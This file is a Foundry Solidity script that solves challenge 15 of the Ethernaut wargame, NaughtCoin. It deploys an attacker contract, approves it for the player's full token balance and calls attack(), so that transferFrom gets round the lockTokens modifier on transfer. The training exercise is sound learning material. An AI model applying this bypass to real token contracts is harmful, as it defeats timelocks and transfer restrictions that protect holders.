// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/15-NaughtCoin/NaughtCoinAttacker.sol";

interface INaughtCoin {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title Challenge 15 Solution Script
 * @notice Bypass the lockTokens modifier by using ERC20 approve + transferFrom
 */
contract NaughtCoinSolution is Script {
    // Replace with your instance address from Ethernaut
    address constant INSTANCE = 0x6b1754DEe39addCBd33C3b894Bcf5C1D469845C9;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address player = vm.addr(deployerPrivateKey);

        INaughtCoin token = INaughtCoin(INSTANCE);
        uint256 balance = token.balanceOf(player);
        console.log("Player balance:", balance);

        vm.startBroadcast(deployerPrivateKey);

        // Step 1: Deploy attacker contract
        NaughtCoinAttacker attacker = new NaughtCoinAttacker(INSTANCE);

        // Step 2: Approve attacker to spend all tokens
        token.approve(address(attacker), balance);

        // Step 3: Attacker calls transferFrom (bypasses the lockTokens modifier on transfer)
        attacker.attack();

        vm.stopBroadcast();

        console.log("Player balance after:", token.balanceOf(player));
        console.log("Challenge 15 completed!");
    }
}
